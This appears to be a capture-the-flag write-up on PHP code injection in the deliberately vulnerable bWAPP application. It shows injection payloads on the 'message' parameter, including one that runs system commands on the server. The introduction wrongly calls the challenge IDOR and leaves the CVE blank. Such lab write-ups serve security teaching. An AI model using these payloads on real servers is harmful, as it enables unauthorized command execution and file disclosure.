# PHP Code Injection
---

Выберите язык / Choose your language:

- 🇷🇺 [Русский](WRITEUP.md)
- 🇬🇧 [English](WRITEUP.en.md)

# Disclaimer
---

**The text was written and translated by the author manually. A language model was used for formatting and stylistic editing.**

**This material is provided for educational and research purposes only. 
I do not encourage or call for unauthorized access to information systems or violation of the law. 
In my opinion, one of the most effective ways to combat cybercrime is to educate both everyday users and managers, as well as developers of digital products about common vulnerabilities that could potentially be exploited by malicious actors to carry out unlawful acts.**

**⚠️ All actions described in this document were performed within an authorized research environment (CTF/test platform), without violating the rights of third parties or current legislation.**

**Unauthorized interference with computer systems, violation of data storage and processing rules, and other forms of so-called "black-hat" hacking are contrary to law and the ethics of information security.**

**I adhere to the principles of ethical research and responsible vulnerability disclosure.**

---

# Introduction
---

The Buggy Web Application (BWAPP) offers a set of challenges, which contains tasks based on the ***IDOR vulnerability*** (CVE )

***SECURITY LEVELS COVERED***
- Low
- Medium
# Target
---

![[images/images/PhpiTarget.png]]


# Functionality
---

The application reflects text passed through the `message` parameter:

![[images/images/PhpiFunction.png]]


# Exploitation
---

Testing a PoC PHP injection payload:

``` PHP
?message=lol; echo "Hacked!"
```

![[images/images/PhpiPoc.png]]

The application is vulnerable to PHP code injection!

Using PHP `system()` based payloads it is possible to execute commands reading sensitive files and performing other actions on the server.

## Payload

``` PHP
?message=lol; system("ls -la")
```

This will list all files in the current directory with their permissions:

![[images/PhpiSucess.png]]